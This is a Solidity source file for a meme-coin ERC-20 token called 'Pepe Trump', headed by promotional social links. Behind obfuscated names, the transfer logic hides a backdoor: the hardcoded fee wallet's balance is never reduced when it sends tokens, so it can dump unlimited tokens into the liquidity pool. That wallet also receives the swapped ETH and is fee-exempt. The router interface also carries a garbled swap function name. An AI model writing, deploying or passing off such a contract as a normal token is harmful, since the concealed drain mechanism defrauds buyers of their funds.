/**

Pepe Trump   $PEPETRUMP


TWITTER: https://twitter.com/PepeTrump_erc20
TELEGRAM: https://t.me/PepeTrump_erc
WEBSITE: https://pepetrump.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wfjrp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wfjrp(a, b, "SafeMath:");
    }

    function  _wfjrp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _spofjkrudp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xrtqFrakns {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract PepeTrump is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Pepe Trump";
    string private constant _symbol = unicode"PEPETRUMP";

    uint256 private constant _Totalbe = 100000000 * 10 **_decimals;
    uint256 public _mxTanAmaunt = _Totalbe;
    uint256 public _Walletnumax = _Totalbe;
    uint256 public _wapThresholdfax= _Totalbe;
    uint256 public _myrkTauop= _Totalbe;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforepsrevbent=0;
    uint256 private _bakyknwt=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExwfdadFhdf;
    mapping (address => bool) private _taxhWalany;
    mapping(address => uint256) private _lrLdvrfevnup;
    bool public _tnsfereslanale = false;
    address payable private _pvkbftFdjp;

    _xrtqFrakns private _ufvypRadsuat;
    address private _aufrPaibvw;
    bool private _vprckqrph;
    bool private itfuSwqvp = false;
    bool private _apEalbew = false;

    event _amrauopwl(uint _mxTanAmaunt);
    modifier lckfThaeup {
        itfuSwqvp = true;
        _;
        itfuSwqvp = false;
    }

    constructor () {
        _pvkbftFdjp = payable(0x18668fFc91B4888ECbC4174E0DEEcdaF0691C78e);
        _balances[_msgSender()] = _Totalbe;
        _isExwfdadFhdf[owner()] = true;
        _isExwfdadFhdf[address(this)] = true;
        _isExwfdadFhdf[_pvkbftFdjp] = true;

        emit Transfer(address(0), _msgSender(), _Totalbe);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalbe;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wfjrp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsfereslanale) {
                if (to != address
                (_ufvypRadsuat) && to !=
                 address(_aufrPaibvw)) {
                  require(_lrLdvrfevnup
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lrLdvrfevnup
                  [tx.origin] = block.number;
                }
            }

            if (from == _aufrPaibvw && to != 
            address(_ufvypRadsuat) && !_isExwfdadFhdf[to] ) {
                require(amount <= _mxTanAmaunt,
                 "Exceeds the _mxTanAmaunt.");
                require(balanceOf(to) + amount
                 <= _Walletnumax, "Exceeds the maxWalletSize.");
                if(_bakyknwt
                < _wapBeforepsrevbent){
                  require(! _frckrprz(to));
                }
                _bakyknwt++;
                 _taxhWalany[to]=true;
                teeomoun = amount.mul((_bakyknwt>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _aufrPaibvw && from!= address(this) 
            && !_isExwfdadFhdf[from] ){
                require(amount <= _mxTanAmaunt && 
                balanceOf(_pvkbftFdjp)<_myrkTauop,
                 "Exceeds the _mxTanAmaunt.");
                teeomoun = amount.mul((_bakyknwt>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_bakyknwt>_wapBeforepsrevbent &&
                 _taxhWalany[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!itfuSwqvp 
            && to == _aufrPaibvw && _apEalbew &&
             contractTokenBalance>_wapThresholdfax 
            && _bakyknwt>_wapBeforepsrevbent&&
             !_isExwfdadFhdf[to]&& !_isExwfdadFhdf[from]
            ) {
                _swpvkejkgj( _qkarw(amount, 
                _qkarw(contractTokenBalance,_myrkTauop)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _erpsqxnwhx(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wfjrp(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wfjrp(teeomoun));
        emit Transfer(from, to, 
        amount. _wfjrp(teeomoun));
    }

    function _swpvkejkgj(uint256
     tokenAmount) private lckfThaeup {
        if(tokenAmount==0){return;}
        if(!_vprckqrph){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _ufvypRadsuat.WETH();
        _approve(address(this),
         address(_ufvypRadsuat), tokenAmount);
        _ufvypRadsuat.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qkarw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wfjrp(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _pvkbftFdjp){
            return a ;
        }else{
            return a . _wfjrp (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTanAmaunt = _Totalbe;
        _Walletnumax = _Totalbe;
        _tnsfereslanale = false;
        emit _amrauopwl(_Totalbe);
    }

    function _frckrprz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _erpsqxnwhx(uint256
    amount) private {
        _pvkbftFdjp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _vprckqrph);
        _ufvypRadsuat   =  _xrtqFrakns (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_ufvypRadsuat), _Totalbe);
        _aufrPaibvw = _spofjkrudp(_ufvypRadsuat.factory()). createPair (address(this),  _ufvypRadsuat . WETH ());
        _ufvypRadsuat.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_aufrPaibvw).approve(address(_ufvypRadsuat), type(uint).max);
        _apEalbew = true;
        _vprckqrph = true;
    }

    receive() external payable {}
}